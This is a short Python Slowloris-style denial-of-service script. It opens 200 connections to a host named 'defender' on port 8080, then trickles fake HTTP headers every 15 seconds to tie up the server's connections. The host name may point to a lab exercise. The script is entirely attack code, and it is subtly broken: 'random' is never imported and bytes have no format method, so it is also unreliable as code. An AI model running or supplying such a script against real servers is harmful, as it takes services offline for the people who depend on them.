import socket
import time

target_ip = "defender"
target_port = 8080

sockets = []
for _ in range(200):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(b"GET / HTTP/1.1\r\n")
    sockets.append(s)

while True:
    for s in sockets:
        try:
            s.send(b"X-a: {}\r\n".format(random.randint(1, 5000)))
        except:
            sockets.remove(s)
    time.sleep(15)